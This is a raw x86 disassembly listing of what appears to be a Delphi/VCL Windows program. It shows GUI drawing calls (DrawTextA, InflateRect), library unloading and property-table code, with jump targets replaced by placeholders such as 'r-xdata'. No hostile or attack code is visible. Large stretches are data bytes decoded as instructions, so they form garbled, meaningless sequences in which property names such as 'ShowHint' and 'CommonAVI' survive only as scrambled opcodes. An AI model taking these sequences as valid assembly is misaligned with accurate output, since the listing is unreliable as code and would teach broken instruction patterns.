lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43fcb0
mov eax [ ebp - 0x1c ]
call sub_4044f8
push eax
mov eax esi
call sub_42146c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f379
lea eax [ ebp - 0x1c ]
call sub_404038
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_420d54
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_42138c
mov edx r-xdata
mov eax esi
call sub_4212e8
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42f424
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442504
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42f47c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44512c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42f59d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44512c
call sub_403b20
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43f490
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43f46c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42f5b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_446fd4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42f5e4
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_447674
pop esi
pop ebx
retn
sub_42f620
push 0x2b004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] ch
add [ eax ] al
push 0x2d004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi ] ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi ] ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ eax ] dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx ] dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx ] dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx ] dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] dl
add [ eax ] al
push 0x15004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi ] dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi ] dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ eax ] bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx ] bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx ] bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx ] bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] bl
add [ eax ] al
push 0x1d004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi ] bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi ] bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ eax ] al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx ] al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx ] al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx ] al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] al
add [ eax ] al
push 0x5004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi ] al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi ] al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ eax ] cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx ] cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx ] cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx ] cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + edi * 8 ] cl
add [ eax ] al
push 0xd004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi ] cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi ] cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl bh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add ah cl
or [ edi ] eax
nop
test [ edx ] rw-data
mov bh dh
inc edx
add [ ecx + ecx - 0x87fffb9 ] bh
inc edx
add [ ecx + ecx - 0x887ffb9 ] dh
inc edx
add [ ecx + ecx - 0x88fffb9 ] ch
inc edx
add [ ecx + ecx - 0x897ffb9 ] ah
inc edx
add [ ecx + ecx - 0x89fffb9 ] bl
inc edx
add [ ecx + ecx - 0x8a7ffb9 ] dl
inc edx
add [ ecx + ecx - 0x8afffb9 ] cl
inc edx
add [ ecx + ecx - 0x8b7ffb9 ] al
inc edx
add [ ecx + ecx + 0x47 ] bh
add [ eax - 0x9 ] al
inc edx
add [ ecx + ecx + 0x47 ] dh
add [ eax ] bh
test [ edx ] rw-data
xor bh dh
inc edx
add [ ecx + ecx + 0x47 ] ah
add [ eax ] ch
test [ edx ] rw-data
and bh dh
inc edx
add [ ecx + ecx + 0x47 ] dl
add [ eax ] bl
test [ edx ] rw-data
adc bh dh
inc edx
add [ ecx + ecx + 0x47 ] al
add [ eax ] cl
test [ edx ] rw-data
add bh dh
inc edx
add [ ecx + ecx ] dh
inc edi
add al bh
test [ edx ] 0x2c
or [ edi ] eax
sub_42f98c
push 0xfa004786
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f9b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f9c0
retn
sub_42f9cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f9fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa04
retn
mov eax [ rw-data ]
call sub_4032e8
sub_42fb07
add [ eax ] al
add [ eax ] al
add ah bl
or [ edi ] eax
sbb al 0x7c
inc edi
add [ eax ] al
add [ eax ] al
add al bl
or [ edi ] eax
jge r-xdata
inc eax
add [ ebx + 0x478a9c2d ] al
add [ ecx ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add ah dl
or [ edi ] eax
cwde
jns r-xdata
retn
mov eax r-xdata
call sub_403e0c
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402cfc
mov ah 0xfa
inc edx
add al ch
xchg ecx eax
inc edx
std
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb63
retn
call sub_42fa98
sub_42fb90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fbb5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fbbc
retn
sub_42fbd7
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42fc1c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc23
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404ac0
sub_42fc3f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42fc84
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc8b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404ac0
sub_42fc9b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fcf1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fcf8
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404038
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42fd04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fd48
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fd4f
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42fd5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fd81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fd88
retn
sub_42fd94
cwde
std
inc edx
add [ ebx ] al
pop ss
push esp
push eax
jb r-xdata
fadd [ ecx ]
cmp al 0x35
jb r-xdata
add [ eax ] al
sub al 0xbf
inc ebx
add [ eax ] cl
jae r-xdata
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
inc eax
inc ecx
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
jb r-xdata
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
outsb
je r-xdata
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
je r-xdata
inc esp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
call 0xffffffffa443424f
outsd
inc esp
xor eax 0x40100040
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp + edi * 8 + 0x700c0042 ] dl
bound ecx [ eax + 0x6f ]
jb r-xdata
inc esp
add al bl
aaa
jpe r-xdata
inc ecx
add [ ebp + ebx + 0x44 ] ch
add [ eax - 0x73ffbc0f ] al
and al 0x44
add [ eax + 0x200043fa ] bl
outsb
je r-xdata
inc esp
add [ ebx + edi * 2 ] dl
add [ edi + ebp * 2 + 0x37d80044 ] ah
insb
or dh [ eax + 0x62 ]
push esi
jb r-xdata
fadd [ ecx ]
or ch dl
inc ecx
inc ebx
add [ eax ] ah
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
je r-xdata
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
adc eax [ fs : ebx ]
mov eax 0xd400446a
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
insb
jae r-xdata
mov al [ edi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fd88
retn
sub al 0xfe
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc [ edx ]
add [ eax ] al
sub_43076c
mov esp 0xd800431b
sbb eax [ ebx ]
test al 0x1a
inc ebx
add [ eax + 0x1a ] bh
inc ebx
add [ eax ] ah
sbb al [ ebx ]
sbb al 0x1b
inc ebx
add [ eax ] dl
sbb al 0x43
add [ 0x73754354 ] cl
je r-xdata
inc esp
add [ eax - 0x63ffbfce ] al
insd
push ebp
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
or [ ebx ] al
inc eax
add al [ eax ]
add [ eax + 0x6 ] cl
inc ebx
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
outsd
ja r-xdata
xor al [ eax ]
call 0xffffffffa4434c2f
outsd
inc esp
add al bl
aaa
inc esp
pushfd
mov eax eax
pushfd
pop es
inc ebx
add [ edi ] al
or eax 0x73754354
je r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add [ ebp + ebx + 0x44 ] ch
add al al
push ds
insd
push ebp
jo r-xdata
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
inc eax
or al bl
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
outsd
ja r-xdata
inc ebx
add [ esp - 0x567ffbc ] cl
inc ebx
add [ eax ] ah
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
call 0xffffffffb8434b54
push 0x44
add ah dl
outsd
inc esp
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
sbb eax 0x1ec00044
xchg esp eax
push es
inc ebx
add al ah
retn 0x43
sub_4309bc
in al dx
sbb al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
adc [ edx ] al
add bh bh
dec eax
pop ds
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ edx ] dl
add al [ eax ]
call [ eax + 0x100431f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
adc al 0x2
add bh bh
fcomp [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
add [ eax ] al
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
and [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
mov al 0x43
add [ eax + eax ] dh
inc [ ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or eax [ ebx + 0x6f ]
scasb [ edi ]
inc ebx
add [ esi + 0x44 ] ch
add [ eax ] al
inc [ eax ]
push 0x6948776f
outsb
je r-xdata
jo r-xdata
jb r-xdata
add [ eax ] dl
inc eax
add [ esi ] bl
add ah ch
inc sp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
jb r-xdata
in eax dx
inc esp
add [ eax + eax ] bh
[ eax - 0x4 ]
insb
inc sp
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
adc al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] dl
inc eax
add [ edx + 0x24ff0000 ] bl
inc [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x61500e00
imul ebp [ esi + 0x74 ] 0x43048073
add [ ecx ] ch
add al [ eax ]
call [ eax ]
and [ ebx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
add [ eax ] al
add [ 0x61500e00 ] dl
insd
outsb
je r-xdata
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
adc [ edi ] bl
inc ebx
add [ eax ] dh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ eax ] cl
push eax
outsd
jae r-xdata
inc [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
je r-xdata
je r-xdata
add al [ eax ]
adc [ eax ] al
push ds
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
outsb
inc ebx
push 0x69676e61
outsb
enter 0x4305 0x0
cmp [ edx ] al
add bh bh
cmp [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
jo r-xdata
inc [ ebx ]
enter 0x43fd 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx + 0xff0000 ] bl
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax + 0x4f0c001f ] al
mov bh 0x43
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0020 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
push es
dec edi
js r-xdata
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
arpl [ ecx + 0x63 ] di
push ebp
jo r-xdata
rol [ ecx ] 0x0
dec ebp
outsd
jne r-xdata
mov al 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsd
outsb
or eax 0x46697661
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
add [ ebx + edi * 2 ] dl
jns r-xdata
inc ebp
js r-xdata
ror [ eax ] 0xd
inc ebx
add [ ebx ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ ecx + 0x61070043 ] al
jbe r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
punpcklwd mm6 [ esi + 0x69 ]
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
jne r-xdata
popad
jbe r-xdata
cmp al 0xb1
inc ebx
add al bl
add [ eax ] al
outsb
inc ebp
outsb
je r-xdata
dec edi
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
add eax 0x2200043
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
add [ ecx + edx * 8 + 0x41 ] bl
arpl [ gs : ecx + 0x63 ] di
insb
or eax 0x44697661
insb
je r-xdata
imul eax [ ebp + 0x6c ] 0x46657465
dec esi
outsd
insd
jo r-xdata
dec ebp
outsd
jbe r-xdata
add [ edi + ecx * 2 ] cl
outsb
dec esp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
cmovae eax [ eax ]
pushad
add al [ eax ]
add [ edi + edi * 4 ] ch
inc ebx
add [ eax ] cl
fadd [ ecx ]
jb r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x656c6946
inc ecx
add [ edi - 0xe7fffbd ] dl
inc ebx
add [ esp - 0x567ffbc ] cl
inc ebx
add [ eax ] ah
fadd [ ecx ]
or ch dl
imul ebp [ ebp + 0x8 ] 0x436d6f43
je r-xdata
inc esi
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
mov al [ 0xffffffffb8004322 ]
push 0x44
add ah al
inc ebx
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
insb
jae r-xdata
je r-xdata
les esi [ eax + 0xe00043 ]
add bh bh
loopne r-xdata
or esp [ ecx + 0x76 ]
imul eax [ ebx + 0x6f ] 0x69467970
insb
push cs
popad
jbe r-xdata
popad
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x646c6f46
jb r-xdata
shl al 0xd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
push cs
inc ebx
add [ edi + ecx ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
push cs
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
inc esp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
call 0xffffffffa4435213
outsd
inc esp
add al bl
aaa
inc esp
rol [ ecx ] 0x1
inc esp
xor eax 0x40100040
insb
inc esi
imul ebp [ ebp + 0xf ] 0x45697661
insd
jo r-xdata
push edx
loop r-xdata
inc ebx
outsd
jo r-xdata
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
or al bl
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
inc ebx
add [ esi ] cl
cmp al 0x35
inc eax
inc esi
imul ebp [ ebp + 0x73 ] 0x6976610b
inc ebx
outsd
jo r-xdata
inc eax
arpl [ gs : ecx + 0x63 ] di
inc esi
imul ebp [ ebp + 0xe ] 0x52697661
sub_430aae
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090016 ] al
outsd
jo r-xdata
inc [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
adc [ eax ] al
push ds
insb
inc sp
add ah ch
inc sp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
jne r-xdata
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
adc [ edi ] bl
inc ebx
add [ eax ] dh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ eax ] cl
push eax
outsd
jae r-xdata
add al [ eax ]
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
je r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
outsb
inc ebx
push 0x69676e61
outsb
enter 0x4305 0x0
cmp [ edx ] al
add bh bh
cmp [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
jo r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx + 0xff0000 ] bl
inc [ ebx ]
enter 0x43fd 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax + 0x4f0c001f ] al
mov bh 0x43
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0020 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
push es
dec edi
js r-xdata
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
arpl [ ecx + 0x63 ] di
push ebp
jo r-xdata
rol [ ecx ] 0x0
dec ebp
outsd
jne r-xdata
mov al 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsd
outsb
or eax 0x46697661
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
add [ ebx + edi * 2 ] dl
jns r-xdata
inc ebp
js r-xdata
ror [ eax ] 0xd
inc ebx
add [ ebx ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] cl
